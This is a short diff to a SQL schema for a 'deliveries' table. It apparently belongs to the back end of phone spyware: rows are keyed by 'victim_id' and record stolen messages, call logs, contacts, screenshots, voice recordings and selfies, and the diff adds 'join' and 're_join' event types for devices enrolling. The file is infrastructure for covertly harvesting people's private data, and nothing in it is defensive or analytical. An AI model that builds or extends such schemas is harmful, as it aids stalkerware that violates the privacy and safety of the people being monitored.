@@ -79,7 +79,7 @@ DROP TABLE IF EXISTS `deliveries`;
 CREATE TABLE IF NOT EXISTS `deliveries` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `victim_id` int(11) NOT NULL,
-  `data_type` enum('messages','call_logs','contacts','file_logs','media_screen_shot','media_voice','media_selfie') NOT NULL,
+  `data_type` enum('messages','call_logs','contacts','file_logs','media_screen_shot','media_voice','media_selfie','join','re_join','other') NOT NULL,
   `error` tinyint(4) NOT NULL,
   `message` text NOT NULL,
   `server_error` tinyint(4) NOT NULL DEFAULT 0,
